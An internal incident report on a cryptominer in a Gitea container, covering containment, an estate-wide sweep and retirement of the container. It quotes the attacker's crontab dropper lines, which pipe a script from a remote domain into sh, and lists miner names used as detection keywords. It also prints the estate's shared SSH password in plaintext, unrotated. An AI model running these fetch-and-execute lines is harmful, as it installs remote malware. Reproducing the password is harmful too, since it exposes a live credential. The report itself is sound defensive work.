# Security incident — cryptominer in the `git` container (i1)

Found 2026-09-27, incidentally, while surveying container CPU for
`container-placement.md`: i1 (`192.168.1.51`) was at load ~18 on 4 vCPU, and the
`git` container held a process `./linuxsys` burning ~208 % CPU and 2.3 GiB.

**Status: resolved (2026-09-27).** The payload was killed and the dropper cron
removed; the container was then **retired** rather than rebuilt — it held no
production repositories and the estate's real Gitea is `.46` `atlas-gitea`. See
Resolution below.

## What was found

| | |
|---|---|
| Host / container | `i1` `.51` / Incus container **`git`** (the Gitea host, `.90`) |
| Payload | `/home/git/linuxsys` — ran as user `git`, ~208 % CPU, 2.3 GiB RES |
| Payload sha256 | `4d17d32ed6efe92ea61d16602f9c6cd5261cdd3820adec427ee68d4088b6ab5b` |
| Binary on disk | **self-deleted** after exec (`/proc/<pid>/exe -> /home/git/linuxsys (deleted)`); a copy was preserved before it vanished |
| Dropper | user `git`'s crontab, every minute |
| C2 / staging | `archive.repositoryserver.org` (`/linuxsh`) |

The malicious crontab (`/var/spool/cron/crontabs/git`):

```
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * curl -s --connect-timeout 10 -k https://archive.repositoryserver.org/linuxsh | sh > /dev/null 2>&1
* * * * * busybox wget -T 10 --no-check-certificate -q -O - http://archive.repositoryserver.org/linuxsh | sh > /dev/null 2>&1
```

The parent was `systemd` → `cron.service`; the process had no name, no service
unit, and a deleted binary — i.e. a classic `curl … | sh` miner with a
two-transport (curl/wget) dropper for robustness.

## Impact

- i1 CPU: load ~6 → ~18 on 4 vCPU; **~2.4 GiB of RAM** held by the payload.
- i1's high `load average` in the 2026-09-27 placement survey was this process,
  not the placement itself.
- No evidence the *host* kernel or any other container was touched (scope below).

## Containment performed

1. Evidence saved on i1 at `/root/incident-20260927-git/`
   (`git-crontab.bak`, `linuxsys-ps.txt`, `linuxsys.sample` (mode 000),
   `linuxsys.sha256`, `netstat.txt`).
2. `crontab -u git -r` — removed the dropper (verified: `no crontab for git`).
3. `kill -9 <pid>` on the payload (verified gone).
4. Re-verified the container: `gitea.service` active, `:3000` → 200;
   `/etc/cron.d`, `atjobs` and `/var/spool/cron/crontabs` clean; no file under
   `/etc /var/spool /home /root /usr/local` still references the C2.
5. i1 recovered: load 18 → **4.8**, ~2.4 GiB RAM freed.

## Scope — estate-wide sweep (2026-09-27)

Checked every Incus container on i1/i2/i3 (24 containers) and each host's root
crontab for the domain, the `/linuxsys` path, and known miner names
(`xmrig`, `kdevtmpfsi`, `stratum`), plus a host-wide process check:

**Clean everywhere except the i1 `git` container.** No lateral spread observed.

## Resolution (2026-09-27)

Retiring the container rather than rebuilding it was the right call once its
data was examined: the instance held **no production repositories**. Its only
repos were exploit-PoC artifacts — projects named `giteaa-<5 digits>` under the
`gitea1337`/`giteaa1337` owners, and `poc-<5 digits>` under `testpoc34645`/
`testpoc95173` — created by random-named users (`lioqmkgkjo`, `kleipjkxjd`,
`zwilrdlohv`, `ywpqqzlgys`) between May and September 2026, with commit subjects
`apply-1`/`apply-2`. That is automated tooling aimed at the Gitea instance, not
the estate's work. The estate's actual Gitea is `.46` `atlas-gitea` (Gitea
1.27.2, Postgres, registration off, sign-in required, `COOKIE_SECURE`), which
*is* `git.innotel.us`; it was empty, and **no NPM host ever pointed at `.90`**
(the only `.90` references in the tree are a certificate-test fixture).

What was done:

1. **Retired.** `incus stop git` + `incus delete git`. i1 is back to 7
   containers, `.90` no longer answers, and `/var/log/incus/git` (plus the
   already-stale `auth` log dir) was removed. This also resolves the
   duplicate-Gitea item in `dev-container-migration.md`.
2. **Credentials.** The container held **no SSH private keys** and
   `/home/git/.ssh/authorized_keys` was empty; Gitea had **0** access tokens, so
   there were no deploy keys or tokens to rotate. The one real exposure is that
   `/etc/gitea/app.ini` carried the DB password **`DD@l1lama`** — the estate's
   own SSH password — reused across the hosts. The compromise therefore has to
   be treated as exposing it; rotating that estate-wide secret is a separate,
   coordinated change (every host's access and the docs move together) and is
   **not** done here. Felt as a leftover, not a closed item.
3. **Authoritative Gitea.** `.46` `atlas-gitea` — no second Gitea remains.
4. **Router reservation.** `.90` (GIT) is now stale; remove it from the router's
   Address Reservation table (UI-only). Marked *(ret.)* in `router.md`.
5. **Evidence kept.** The miner sample (`linuxsys.sample`, mode 000) and the
   containment logs stay at i1 `/root/incident-20260927-git/`; the retired
   container's config, users and repo list were saved beside them as
   `gitea-forensics.txt`.
